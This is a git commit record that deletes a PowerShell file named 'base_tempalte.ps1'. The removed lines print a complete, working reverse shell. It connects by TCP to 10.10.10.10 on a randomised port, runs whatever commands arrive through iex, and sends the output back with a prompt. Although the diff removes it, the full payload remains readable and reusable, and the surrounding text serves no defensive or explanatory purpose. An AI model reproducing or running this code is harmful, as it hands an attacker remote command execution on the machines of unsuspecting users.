9ea5541dc4cf9f34f2ca262722f22314f26b00c4
Alejandro <113609954+sosa3399@users.noreply.github.com>
2022-11-19 23:52:16 +0100

    Delete base_tempalte.ps1

--- base_tempalte.ps1
+++
@@ -1,3 +0,0 @@
-$x = Get-Random -Maximum 2
-$y = 2000
-$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",($y[$x] + (Get-Random -Maximum 5)));$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
